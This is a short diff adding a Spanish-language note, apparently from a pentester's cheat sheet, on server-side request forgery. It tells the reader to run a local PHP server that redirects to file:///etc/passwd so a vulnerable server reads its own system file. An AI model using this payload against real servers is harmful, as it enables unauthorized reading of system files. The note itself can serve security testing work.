@@ -1,0 +1,3 @@
+SSRF por url:
+  crear un servidor php en local, y poner:
+    header('location:file:///etc/passwd');
